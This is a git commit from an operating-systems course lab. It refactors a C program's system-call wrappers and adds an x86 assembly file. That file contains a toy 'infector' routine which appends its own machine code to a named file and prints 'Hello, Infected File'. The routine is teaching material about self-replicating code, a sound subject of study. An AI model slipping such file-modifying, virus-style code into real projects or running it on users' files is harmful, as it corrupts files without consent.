d2dd5bb986dc93517562858a9071b5c0cfcdc3b6
netanelpr <pratn@post.bgu.ac.il>
2020-04-28 11:33:27 +0300

    Update system call code
    Update system call code

--- lab4/task1/encoder.c
+++ lab4/task1/encoder.c
@@ -2,10 +2,10 @@
 
 /*+++++++++++++++ Rapers for debug +++++++++++++++*/
 
-int system_call_open_raper(int op, char *str, unsigned int mode);
-int system_call_raper_rw(int op, int fd, char *str, int size);
-int system_call_raper_lseek(int op, int fd, int offset, unsigned int mode);
+typedef unsigned long ulong;
+extern int system_call(ulong arg1, ulong arg2,ulong arg3, ulong arg4);
 
+int system_call_debug_wrapper(ulong arg1, ulong arg2,ulong arg3, ulong arg4);
 /*+++++++++++++++ System call func +++++++++++++++*/
 
 #define EOF (-1)
@@ -17,38 +17,51 @@ int system_call_raper_lseek(int op, int fd, int offset, unsigned int mode);
 #define SYS_READ    3
 #define SYS_WRITE   4
 #define SYS_OPEN    5
+#define SYS_CLOSE   6
 #define SYS_LSEEK   19
+#define SYS_GETDENTS    141
 
 #define O_RDONLY	00000000
 #define O_WRONLY	00000001
 #define O_RDWR      00000002
 #define O_CREAT		00000100
 #define O_TRUNC		00001000
+#define O_DIRECTORY	00200000
 
-# define SEEK_SET 0
+#define SEEK_SET 0
+
+#define S_RWE 511
 
 int readByte(int fd, char *c){
-    return system_call_raper_rw(SYS_READ, fd, c, 1);
+    return system_call_debug_wrapper(SYS_READ, (ulong)fd, (ulong)c, (ulong)1);
 }
 
 int lseek_set(int fd, int offset){
-    return system_call_raper_lseek(SYS_LSEEK, fd, offset, SEEK_SET);
+    return system_call_debug_wrapper(SYS_LSEEK, (ulong)fd, (ulong)offset, SEEK_SET);
 }
 
 int write(int fd, char *c, unsigned int size){
-    return system_call_raper_rw(SYS_WRITE, fd, c, size);
+    return system_call_debug_wrapper(SYS_WRITE, (ulong)fd, (ulong)c, (ulong)size);
 }
 
 int writeByte(int fd, char *c){
     return write(fd, c, 1);
 }
 
-int open(char *file_name, unsigned int mode){
-    return system_call_open_raper(SYS_OPEN, file_name, mode);
+int open(char *file_name, int flag, int mode){
+    return system_call_debug_wrapper(SYS_OPEN, (ulong)file_name, (ulong)flag, (ulong)mode);
 }
 
-int write_no_debug(int fd, char *c, unsigned int size){
-    return system_call(SYS_WRITE, fd, c, size);
+int close(int fd){
+    return system_call_debug_wrapper(SYS_CLOSE, (ulong)fd, 0, 0);
+}
+
+int getdirent(int fd, char *buf, int size){
+    return system_call_debug_wrapper(SYS_GETDENTS, (ulong)fd, (ulong)buf, (ulong)size);
+}
+
+int write_no_debug(int fd, char *c, int size){
+    return system_call(SYS_WRITE, (ulong)fd, (ulong)c, (ulong)size);
 }
 
 int writeByte_no_debug(int fd, char *c){
@@ -59,54 +72,51 @@ int writeByte_no_debug(int fd, char *c){
 
 int DEBUG_FLAG = 0;
 
-#define BUFFER_SIZE 12
+#define BUFFER_SIZE_DEBUG   12
+#define BUFFER_SIZE_NUMBER  12
+#define BUFFER              8192
 #define NEW_LINE 10
+#define NULL 0
 
-void print_debug_syscall(int op, int retVal){
+typedef struct ent {
+    int	    indoe;
+	int	    offset;
+	short	len;
+	char	name[];
+} ent;
+
+void print_debug_syscall(ulong arg1, ulong arg2,ulong arg3, ulong arg4, int retVal){
 
     char tmp_c = '\t';
     write_no_debug(STDERR, "ID: ", 4);
-    write_no_debug(STDERR, itoa(op), BUFFER_SIZE);
+    write_no_debug(STDERR, itoa((int)arg1), BUFFER_SIZE_DEBUG);
+    writeByte_no_debug(STDERR, &tmp_c);
+
+    write_no_debug(STDERR, "arg2 : ", 7);
+    write_no_debug(STDERR, itoa((int)arg2), BUFFER_SIZE_DEBUG);
+    writeByte_no_debug(STDERR, &tmp_c);
+
+    write_no_debug(STDERR, "arg3 : ", 7);
+    write_no_debug(STDERR, itoa((int)arg3), BUFFER_SIZE_DEBUG);
+    writeByte_no_debug(STDERR, &tmp_c);
+
+    write_no_debug(STDERR, "arg4 : ", 7);
+    write_no_debug(STDERR, itoa((int)arg4), BUFFER_SIZE_DEBUG);
     writeByte_no_debug(STDERR, &tmp_c);
 
     tmp_c = NEW_LINE;
     write_no_debug(STDERR, "Ret: ", 5);
-    write_no_debug(STDERR, itoa(retVal), BUFFER_SIZE);
+    write_no_debug(STDERR, itoa(retVal), BUFFER_SIZE_DEBUG);
     writeByte_no_debug(STDERR, &tmp_c);
 }
 
-/* use for open */
-int system_call_open_raper(int op, char *str, unsigned int mode){
+int system_call_debug_wrapper(ulong arg1, ulong arg2,ulong arg3, ulong arg4){
     int retVal = 0;
 
-    retVal = system_call(op, str, mode);
+    retVal = system_call(arg1, arg2, arg3, arg4);
     
     if(DEBUG_FLAG){
-        print_debug_syscall(op, retVal);
-    }
-
-    return retVal;
-}
-
-int system_call_raper_rw(int op, int fd, char *str, int size){
-    int retVal = 0;
-
-    retVal = system_call(op, fd, str, size);
-    
-    if(DEBUG_FLAG){
-        print_debug_syscall(op, retVal);
-    }
-
-    return retVal;
-}
-
-int system_call_raper_lseek(int op, int fd, int offset, unsigned int mode){
-    int retVal = 0;
-
-    retVal = system_call(op, fd, offset, mode);
-    
-    if(DEBUG_FLAG){
-        print_debug_syscall(op, retVal);
+        print_debug_syscall(arg1, arg2, arg3, arg4, retVal);
     }
 
     return retVal;
@@ -116,27 +126,11 @@ int system_call_raper_lseek(int op, int fd, int offset, unsigned int mode){
 #define BA 96
 #define AZ 123
 
-char print_debug_and_return_upper_case_char(char c, int fd){
+char upper_case(char c, int fd){
     
-    char inputChar = c;
     if((c > BA) & (c < AZ)){
         c = c - DIF;
     }
-
-    /*if(DEBUG_FLAG){
-        if(inputChar == NEW_LINE){
-            write(STDERR, "\n", sizeof("\n"));
-        } else {
-            char tmp_c = '\t';
-
-            write(STDERR, itoa(inputChar), BUFFER_SIZE);
-            writeByte(STDERR, &tmp_c);
-
-            tmp_c = NEW_LINE;
-            write(STDERR, itoa(c), BUFFER_SIZE);
-            writeByte(STDERR, &tmp_c);
-        }
-    }*/
 
     return c;
 }
@@ -145,7 +139,7 @@ void print_upper_case(int ifd, int ofd){
     char inputChar = '\0';
 
     while(readByte(ifd, &inputChar) > 0){
-        inputChar = print_debug_and_return_upper_case_char(inputChar, ofd);
+        inputChar = upper_case(inputChar, ofd);
         writeByte(ofd, &inputChar);
     }
 }
@@ -158,12 +152,12 @@ int main (int argc , char* argv[], char* envp[])
 
     for(i=1; i < argc; i=i+1){
         if(strncmp("-o", argv[i], 2) == 0){
-            ofd = open(argv[i]+2, (O_WRONLY | O_CREAT | O_TRUNC));
+            ofd = open(argv[i]+2, (O_WRONLY | O_CREAT | O_TRUNC), S_RWE);
             continue;
         }
 
         if(strncmp("-i", argv[i], 2) == 0){
-            ifd = open(argv[i]+2, O_RDONLY);
+            ifd = open(argv[i]+2, O_RDONLY, 0);
             continue;
         }
 
@@ -176,6 +170,8 @@ int main (int argc , char* argv[], char* envp[])
     }
 
     print_upper_case(ifd, ofd);
+    close(ifd);
+    close(ofd);
     
     return 0;
 }
---
+++ lab4/task2c/start.s
@@ -0,0 +1,108 @@
+section .text
+global _start
+global system_call
+global infection
+global infector
+extern main
+
+_start:
+    pop    dword ecx    ; ecx = argc
+    mov    esi,esp      ; esi = argv
+    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+    mov     eax,ecx     ; put the number of arguments into eax
+    shl     eax,2       ; compute the size of argv in bytes
+    add     eax,esi     ; add the size to the address of argv 
+    add     eax,4       ; skip NULL at the end of argv
+    push    dword eax   ; char *envp[]
+    push    dword esi   ; char* argv[]
+    push    dword ecx   ; int argc
+
+    call    main        ; int main( int argc, char *argv[], char *envp[] )
+
+    mov     ebx,eax
+    mov     eax,1
+    int     0x80
+    nop
+        
+system_call:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    sub     esp, 4          ; Leave space for local var on stack
+    pushad                  ; Save some more caller state
+
+    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
+    mov     ebx, [ebp+12]   ; Next argument...
+    mov     ecx, [ebp+16]   ; Next argument...
+    mov     edx, [ebp+20]   ; Next argument...
+    int     0x80            ; Transfer control to operating system
+    mov     [ebp-4], eax    ; Save returned value...
+    popad                   ; Restore caller state (registers)
+    mov     eax, [ebp-4]    ; place returned value where caller can see it
+    add     esp, 4          ; Restore caller state
+    pop     ebp             ; Restore caller state
+    ret                     ; Back to caller
+
+code_start:
+    push    ebp 
+    mov     ebp, esp 
+
+    call infection
+
+    push dword [ebp+8]
+    call infector
+    sub esp, 4
+
+    pop ebp
+    ret
+
+infection:
+    push    ebp 
+    mov     ebp, esp 
+    pushad    ; save eax for the result from syscall
+
+    mov     eax, 4  ; SYS_WRITE
+    mov     ebx, 1  ; STDOUT
+    mov     dword ecx, START_MESSAGE
+    mov     edx, 22 ; len of START_MESSAGE
+    int     0x80
+
+    popad                   ; Restore caller state (registers)
+    pop ebp
+    ret
+
+START_MESSAGE: db "Hello, Infected File", 10, 
+
+infector:
+    push    ebp 
+    mov     ebp, esp
+    sub     esp, 4  
+    pushad    ; save eax for the result from syscall
+
+open_file:
+    mov     eax, 5          ; SYS_WRITE
+    mov     ebx, [ebp+8]    ; filename
+    mov     ecx, 2 | 1024      
+    mov     edx, 0
+    int 0x80
+    mov [ebp-4], eax  
+
+write_file:
+    mov     eax, 4              ; SYS_WRITE
+    mov     dword ebx, [ebp-4]  ; fd
+    mov     ecx, code_start     ; start buffer
+    mov     edx, code_end
+    sub     edx, code_start
+    int 0x80
+
+close_file:
+    mov     eax, 6              ; SYS_CLOSE
+    mov     dword ebx, [ebp-4]  ; fd
+    int 0x80
+
+end_infector:
+    popad                   ; Restore caller state (registers)
+    add     esp, 4 
+    pop     ebp
+    ret
+
+code_end:
